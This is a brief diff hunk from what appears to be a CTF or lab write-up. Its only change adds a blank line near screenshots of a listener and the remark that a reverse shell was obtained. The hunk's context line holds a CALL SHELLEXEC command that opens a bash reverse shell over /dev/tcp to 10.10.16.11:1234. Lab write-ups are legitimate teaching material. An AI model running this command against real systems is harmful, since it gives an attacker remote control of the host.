@@ -86,6 +86,7 @@ CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
 ![](https://i.ibb.co/dtjG5BM/image.png)
 
 **Our listner..**
+
 ![](https://i.ibb.co/XshCJMZ/image.png)
 
 > * We got reverse shell successfully.
